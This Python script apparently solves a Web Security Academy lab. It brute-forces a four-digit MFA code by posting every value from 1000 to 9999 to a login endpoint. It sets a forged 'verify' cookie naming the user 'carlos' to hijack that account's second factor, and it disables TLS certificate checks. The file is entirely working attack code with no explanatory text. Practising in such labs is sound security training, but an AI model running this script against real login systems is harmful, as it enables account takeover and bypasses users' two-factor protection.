import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://acd41fc81fc4d2e3c1204cc000fa00ba.web-security-academy.net/login2"
page_cookies = {'verify': 'carlos','session': 'aI20GIQYgulzZ2xHI0Rnf2GmXgyco7w4'}

for code in range(1000,10000):
    body = {'mfa-code': code}

    req = requests.post(url, data=body, cookies=page_cookies, verify=False)

    if 'Incorrect security code' in req.text:
        print(f"{code}:{req.status_code}:Invalid code")
    else:
        print(f"{code}:{req.status_code}:GG")
        break
